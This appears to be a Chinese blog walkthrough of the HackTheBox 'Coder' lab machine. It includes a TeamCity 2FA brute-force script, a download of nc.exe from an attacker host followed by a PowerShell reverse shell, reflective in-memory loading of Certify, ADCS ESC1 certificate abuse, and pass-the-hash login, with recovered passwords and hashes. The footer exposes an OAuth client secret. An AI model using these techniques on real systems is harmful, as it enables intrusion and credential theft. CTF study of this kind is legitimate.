class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">"ignore"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(l: typing.Iterable, n: int)</span>:</span></span><br><span class="line">    <span class="string">"""Yield n number of striped chunks from l."""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, n):</span><br><span class="line">        <span class="keyword">yield</span> l[i::n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_cookies</span><span class="params">(wordlist: list, pbar: tqdm.tqdm)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.cookies[<span class="string">"TCSESSIONID"</span>] = args.session_id</span><br><span class="line">    s.headers[<span class="string">'X-Requested-With'</span>] = <span class="string">'XMLHttpRequest'</span></span><br><span class="line">    s.headers[<span class="string">'X-TeamCity-Client'</span>] = <span class="string">'Web UI'</span></span><br><span class="line">    s.headers[<span class="string">'X-TC-CSRF-Token'</span>] = args.csrf_token</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> wordlist:</span><br><span class="line">        response = s.post(<span class="string">"https://teamcity-dev.coder.htb/2fa.html"</span>, data=&#123;<span class="string">"password"</span>: guess&#125;, verify=<span class="keyword">False</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">302</span>:</span><br><span class="line">            logger.info(s.cookies.items())</span><br><span class="line">            logger.success(<span class="string">f"Logged in with code <span class="subst">&#123;guess&#125;</span>"</span>)</span><br><span class="line">        <span class="comment"># elif not response.ok:</span></span><br><span class="line">        <span class="comment">#     logger.debug(response.status_code)</span></span><br><span class="line">        pbar.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'--session-id'</span>, <span class="string">'-s'</span>, default=<span class="string">'843D031AFDB95E5CAC860C82FF503DDE'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--csrf-token'</span>, <span class="string">'-c'</span>, default=<span class="string">'50fbe4ac-459d-4eca-9b35-efeefd9a794c'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--threads'</span>, <span class="string">'-n'</span>, default=<span class="number">100</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    wordlist = tuple(<span class="string">f'<span class="subst">&#123;x:<span class="number">06</span>&#125;</span>'</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000000</span>))</span><br><span class="line">    <span class="keyword">with</span> tqdm.tqdm(total=len(wordlist), mininterval=<span class="number">2</span>) <span class="keyword">as</span> pbar:</span><br><span class="line">        <span class="keyword">with</span> ThreadPoolExecutor(max_workers=args.threads) <span class="keyword">as</span> executor:</span><br><span class="line">            futures = [executor.submit(try_cookies, w, pbar) <span class="keyword">for</span> w <span class="keyword">in</span></span><br><span class="line">                       chunks(wordlist, args.threads)]</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> futures:</span><br><span class="line">        results.append(future.result())</span><br></pre></td></tr></table></figure>

<h2 id="预期方法"><a href="#预期方法" class="headerlink" title="预期方法"></a>预期方法</h2><p>参考：</p>
<ul>
<li>HTB: Coder | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2023/12/16/htb-coder.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2023/12/16/htb-coder.html</a></li>
</ul>
<p>简单来说，就是前面keepass中得到的数据是加密备份的，直接添加进去生成的OTP是无法使用的，因为不知道密钥</p>
<p>然后根据加密方式写脚本爆破出加密用的密钥，然后解密得到真正的secret</p>
<p>之后就是正常的OTP登录，后面部分相同</p>
<h1 id="teamcity-getshell"><a href="#teamcity-getshell" class="headerlink" title="teamcity getshell"></a>teamcity getshell</h1><ul>
<li>Running Personal Build | TeamCity On-Premises Documentation<br><a href="https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload" target="_blank" rel="noopener">https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload</a></li>
</ul>
<p>根据文档，可以通过patch的方式运行，patch需要是一个格式正确的diff文件,   直接根据smb里的repo修改后diff即可：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040412.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040413.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>提交运行，得到svc_teamcity：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040414.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="e-black-信息"><a href="#e-black-信息" class="headerlink" title="e.black 信息"></a>e.black 信息</h1><p>打到的shell当前目录有个key(不确定是本身就该有的还是别人放的，根据文件时间应该是原本就有的，不过无所谓，自己也能根据diff还原出来)，查看之前的diff发现密码相关信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\ProgramData\JetBrains\Teamcity\system\changes\101.changes.diff</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040415.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040416.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>根据diff还原出enc，参考原本的命令解出e.black明文密码：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="built_in">Get-Content</span> <span class="string">".\key.key"</span></span><br><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.8</span>:<span class="number">7778</span>/enc.txt -o .\enc.txt</span><br><span class="line"><span class="variable">$pass</span> = (<span class="built_in">Get-Content</span> <span class="string">".\enc.txt"</span> | <span class="built_in">ConvertTo-SecureString</span> -Key <span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$UnsecurePassword</span> = (<span class="built_in">New-Object</span> PSCredential <span class="number">0</span>, <span class="variable">$pass</span>).GetNetworkCredential().Password</span><br><span class="line">echo <span class="variable">$UnsecurePassword</span></span><br><span class="line"></span><br><span class="line">ypOSJXPqlDOxxbQSfEERy300</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040417.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="enc-txt"><a href="#enc-txt" class="headerlink" title="enc.txt"></a>enc.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的账号密码登录，桌面得到user flag：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm  -u 'e.black' -i 10.10.11.207</span><br><span class="line"></span><br><span class="line">ypOSJXPqlDOxxbQSfEERy300</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040418.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>当前用户在PKI Admins组中，前面也看到有ADCS相关，那就重点看这部分,使用支持pki的rusthound：</p>
<ul>
<li>OPENCYBER-FR/RustHound: Active Directory data collector for BloodHound written in Rust. 🦀<br><a href="https://github.com/OPENCYBER-FR/RustHound" target="_blank" rel="noopener">https://github.com/OPENCYBER-FR/RustHound</a></li>
</ul>
<p>或者简单的直接Cetrify内存执行查询pki相关,(先在evil-winrm里再执行一次reverse，不然没输出)：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> curl http://<span class="number">10.10</span>.<span class="number">14.8</span>:<span class="number">7777</span>/nc.exe -o .\nc.exe</span><br><span class="line"> .\nc.exe <span class="number">10.10</span>.<span class="number">14.8</span> <span class="number">4444</span> -e powershell.exe</span><br><span class="line"></span><br><span class="line"><span class="variable">$bytes</span> = (<span class="built_in">Invoke-WebRequest</span> <span class="string">"http://10.10.14.8:7777/Certify.exe"</span> -UseBasicParsing ).Content</span><br><span class="line"><span class="variable">$assembly</span> = [System.Reflection.Assembly]::Load(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="variable">$entryPointMethod</span> = <span class="variable">$assembly</span>.GetTypes().Where(&#123; <span class="variable">$_</span>.Name <span class="nomarkup">-eq</span> <span class="string">'Program'</span> &#125;, <span class="string">'First'</span>).GetMethod(<span class="string">'Main'</span>, [Reflection.BindingFlags] <span class="string">'Static, Public, NonPublic'</span>)</span><br><span class="line"><span class="variable">$entryPointMethod</span>.Invoke(<span class="literal">$null</span>, (, [string[]] (<span class="string">'pkiobjects'</span>)))</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040419.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>输出显示PKI Admins对coder-DC01-CA有写权限</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040420.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>有写权限就可以直接写入一个存在漏洞的模板，然后利用ADCS：</p>
<ul>
<li>GoateePFE/ADCSTemplate: A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments.<br><a href="https://github.com/GoateePFE/ADCSTemplate" target="_blank" rel="noopener">https://github.com/GoateePFE/ADCSTemplate</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.8</span>:<span class="number">7778</span>/ADCSTemplate.psm1 -o .\ADCSTemplate.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> .\ADCSTemplate.psm1</span><br><span class="line"></span><br><span class="line">Export-ADCSTemplate -DisplayName User &gt; miao.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载到本地，修改内容</span></span><br><span class="line">Changed msPKI-Certificate-Name-Flag to <span class="number">1</span> <span class="keyword">for</span> enrollee supplies subject</span><br><span class="line">Changed msPKI-Enrollment-Flag to <span class="number">0</span> <span class="keyword">for</span>  none </span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新上传，导入，创建模板</span></span><br><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.8</span>:<span class="number">7778</span>/miao.json -o .\miao.json</span><br><span class="line"></span><br><span class="line">New-ADCSTemplate -DisplayName test1 -JSON (<span class="built_in">Get-Content</span> .\miao.json -Raw) -Publish</span><br><span class="line"><span class="comment"># 给e.black enroll 权限</span></span><br><span class="line">Set-ADCSTemplateACL -DisplayName test1 -Type Allow -Identity <span class="string">'CODER.HTB\e.black'</span> -Enroll</span><br><span class="line"><span class="comment"># 然后就是ESC1</span></span><br><span class="line">certipy find -vulnerable -stdout -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip <span class="number">10.10</span>.<span class="number">11.207</span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040421.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>这里也有坑，4.0.0的certipy auth时一直报错，4.4.0就正常得到hash:</p>
<ul>
<li>Release Certipy 4.4.0 · ly4k/Certipy<br><a href="https://github.com/ly4k/Certipy/releases/tag/4.4.0" target="_blank" rel="noopener">https://github.com/ly4k/Certipy/releases/tag/4.4.0</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 4.4.0 certipy</span></span><br><span class="line">python3 setup.py install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> esc1 获取证书</span></span><br><span class="line">certipy-ad req -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -target dc01.coder.htb -template test2 -ca coder-DC01-CA -upn administrator@coder.htb -dns dc01.coder.htb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> auth时可能会报错时钟偏移问题，先ntp同步时间</span></span><br><span class="line">sudo ntpdate -s 10.10.11.202</span><br><span class="line"></span><br><span class="line">certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.11.207</span><br><span class="line"></span><br><span class="line">[*] Got hash for 'administrator@coder.htb': aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040422.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040423.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>使用得到的hash登录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm  -u Administrator -H 807726fcf9f188adc26eeafd7dc16bb7 -i 10.10.11.207</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040424.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>Running Personal Build | TeamCity On-Premises Documentation<br><a href="https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload" target="_blank" rel="noopener">https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload</a></li>
<li>OPENCYBER-FR/RustHound: Active Directory data collector for BloodHound written in Rust. 🦀<br><a href="https://github.com/OPENCYBER-FR/RustHound" target="_blank" rel="noopener">https://github.com/OPENCYBER-FR/RustHound</a></li>
<li>GoateePFE/ADCSTemplate: A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments.<br><a href="https://github.com/GoateePFE/ADCSTemplate" target="_blank" rel="noopener">https://github.com/GoateePFE/ADCSTemplate</a></li>
<li>GhostPack/Certify: Active Directory certificate abuse.<br><a href="https://github.com/GhostPack/Certify" target="_blank" rel="noopener">https://github.com/GhostPack/Certify</a></li>
<li>ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse<br><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">https://github.com/ly4k/Certipy</a></li>
<li>HTB: Coder | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2023/12/16/htb-coder.html#" target="_blank" rel="noopener">https://0xdf.gitlab.io/2023/12/16/htb-coder.html#</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最後更新時間：<time datetime="2023-12-18T00:36:23.616Z" itemprop="dateUpdated">2023-12-18 08:36:23</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/&title=《Coder - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/&title=《Coder - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/04/05/Coder-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Coder - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/04/10/Busqueda-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Busqueda - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/03/27/Socket-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Socket - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>本部落格係採用<a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh_TW" target="_blank">創用 CC 姓名標示 4.0 國際 授權條款授權</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2024</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/&title=《Coder - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/&title=《Coder - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/04/05/Coder-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Coder - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/04/05/Coder-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3aS27DMAxF0ex/0ynQUYHWyn2kXMDU1ShwEkfHA0b8vF54vb8Xuf7+scj13+9efWbDkiFDxmMZ7+W62sTVu+vvru/A7/wHVYYMGQcw1sF0HQT5psl18rsyZMiQUQt8ta3zoCxDhgwZtTCaHvJkyJAho8PgR7RdaWoaxLfl4jJkyHggI20M/OfrG/sbMmTIeAjj3VikWEaamht2IkOGjNGMWrK6N7D2G6gyZMiYzUgLbekg1/p6Gogv9yNDhozRjHTAlATf/idTqgwZMk5g7A1/HUwniMuQIWMqo3ak41fS9JUfKGXIkHEOo9YN3FXcrz2abU1NGTJkPIRRC4J7Qycv5BWblzJkyBjBWIcz3krsD0/U/hJkyJAxmxHU5HDKytuNvOhPHpwMGTJOYKSHwnSo4o5HI0OGjBMYKAaDNmRa20sPhR+CsgwZMg5g8LJXpzHQD7XxcVCGDBkjGCRR5DdNQ2dtpAydcGXIkDGIQY56PEG97/WHXcmQIWM0I20M3DeL1WkVyJAhYzaDJ7HpaEWnVRk/FBkyZIxm1KpVadE/PQ6mTQIZMmTMZnQGTNdbrBXgyNjHh1xchgwZ4xh81Qa/SNjdFYhlyJAxm8FTR3KF/ErasESHVxkyZBzASAcjeJOgxubhW4YMGTJ4Akmamv0CHGoGyJAh42AGCb68eckfSmtORIYMGYMYPInlobNTjEu/JUOGjNmM+xoDPHD3y3AyZMgYyvgCTuajiQ9JXjYAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
